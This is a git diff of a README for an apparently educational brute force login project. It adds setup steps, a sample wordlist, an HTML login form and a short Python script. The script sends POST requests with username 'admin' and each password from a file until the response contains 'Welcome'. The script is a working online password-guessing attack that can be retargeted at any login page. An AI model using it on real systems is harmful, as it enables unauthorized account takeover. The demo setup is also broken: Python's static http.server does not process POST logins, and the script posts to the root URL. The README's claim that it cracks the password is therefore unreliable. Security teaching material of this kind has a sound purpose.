@@ -1,31 +1,47 @@
-# Brute Force Login Script
-This is a brute force script developed for educational purposes, demonstrating a basic brute force attack technique to discover login credentials. The script attempts various combinations of username and password until it finds the correct one. This project was created to help beginner pentesters understand how brute force scripts work.
+#  Brute Force Attack Script
 
-## Warning: 
-This script should only be used in controlled environments with explicit permission. Unauthorized use of this script on unauthorized systems is illegal and can lead to severe legal consequences.
+## Overview
+This project demonstrates a simple brute force attack script using Python. The script attempts to crack a password by systematically trying a list of possible passwords. The goal is to educate about security vulnerabilities and the importance of strong passwords, and to provide a hands-on example for beginners in penetration testing.
 
-# How It Works
-The script attempts to log in by sending POST requests to a specific URL. It uses a list of possible passwords stored in a text file and checks if the server's response indicates a successful login.
+ **⚠️ Warning:** This script is for educational purposes only. Do not use it on any system without explicit permission from the owner.
 
-### Requirements
+ ## Features
+* **Automated Login** Attempts: The script sends POST requests to a web server to attempt logins with different password combinations.
+* **Custom Wordlist:** You can supply your own list of potential passwords to test.
+* **Success Notification:** The script notifies you when the correct password is found.
+
+## Requirements
 
 * Python 3.x
-* requests library
-* A locally running web server with a login form.
+* `requests` library
 
-### Download
-To download the project, you can clone the repository using Git:
+You can install the required library using the following command:
 
-git clone https://github.com/yourusername/brute_force_login_script.git
+`pip install requests`
 
-Alternatively, you can download the ZIP file directly from GitHub and extract it to your preferred location.
+## Setup
 
+1- Clone the repository:
 
-# Setup and Execution
-### 1. Server Setup
+`git clone https://github.com/yourusername/brute-force-script.git`
 
-Before running the brute force script, you need to set up a web server that contains a login form. Below is an example of a simple HTML login form:
-'''
+`cd brute-force-script`
+
+2- Create a `passwords.txt` file in the same directory with a list of potential passwords, each on a new line:
+
+`password123`
+
+`qwerty`
+
+`letmein`
+
+`admin123`
+
+`senhafoda`
+
+3- Create the HTML login page (if needed):
+
+```
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -34,8 +50,8 @@ Before running the brute force script, you need to set up a web server that cont
     <title>Login Page</title>
 </head>
 <body>
-    <h2>Login</h2>
-    <form method="POST" action="/login">
+    <h2>Login Page</h2>
+    <form action="/login" method="post">
         <label for="username">Username:</label><br>
         <input type="text" id="username" name="username"><br><br>
         <label for="password">Password:</label><br>
@@ -43,7 +59,48 @@ Before running the brute force script, you need to set up a web server that cont
         <input type="submit" value="Login">
     </form>
 </body>
-</html> 
+</html>
+```
+
+4- Run a local server to host the HTML page:
+
+`python3 -m http.server 8000`
+
+
+## Usage
+
+1- Running the Script:
+
+Edit the `brute_force.py` script to point to your local server:
+
+```
+import requests
+
+url = 'http://0.0.0.0:8000/'
+usernames = ['admin']
+passwords = open('/path/to/your/passwords.txt', 'r').readlines()
+
+for username in usernames:
+    for line in passwords:
+        password = line.strip()
+        response = requests.post(url, data={'username': username, 'password': password, 'submit': 'Login'})
+        if "Welcome" in response.text:  
+            print(f"=========[+] PASSWORD CRACKED: {password} =========")
+            break
+        else:
+            print(f"[-] Password invalid: {password}")
+```
+
+2- Run the Script:
+
+`python3 brute_force.py`
+
+The script will attempt to log in with each password in the passwords.txt file and will notify you when it successfully cracks the password.
+
+# License
+
+This project is licensed under the MIT License - see the LICENSE file for details.
+
 
 
 
